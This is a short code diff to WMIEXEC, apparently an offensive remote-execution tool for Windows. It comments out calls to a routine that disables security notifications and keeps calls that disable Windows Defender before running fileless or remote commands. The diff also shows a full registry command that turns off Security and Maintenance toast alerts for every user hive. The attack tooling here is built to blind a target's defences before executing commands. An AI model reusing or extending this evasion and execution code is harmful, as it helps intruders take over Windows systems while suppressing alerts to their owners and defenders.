@@ -96,7 +96,7 @@ class WMIEXEC:
 
     def execute_handler(self, data):
         if self.__retOutput:
-            self.disable_notifications()
+            #self.disable_notifications()
             self.disable_defender()
             try:
                 self.execute_fileless(data)
@@ -104,7 +104,7 @@ class WMIEXEC:
                 self.cd('\\')
                 self.execute_remote(data)
         else:
-            self.disable_notifications()
+            #self.disable_notifications()
             self.disable_defender()
             self.execute_remote(data)
 
@@ -162,6 +162,9 @@ class WMIEXEC:
         self.__smbconnection.deleteFile(self.__share, self.__output)
 
     def disable_notifications(self):
+        """
+        Cant figure out how to make these apply at runtime??
+        """
         command = self.__shell + """"FOR /F %a IN ('REG.EXE QUERY hku 2^>NUL ^| FIND ^"HKEY_USERS^"') DO REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance^" /v ^"Enabled^" /d ^"0^" /t REG_DWORD /F" """
 
         logging.debug('notifications being disabling using: ' + command)
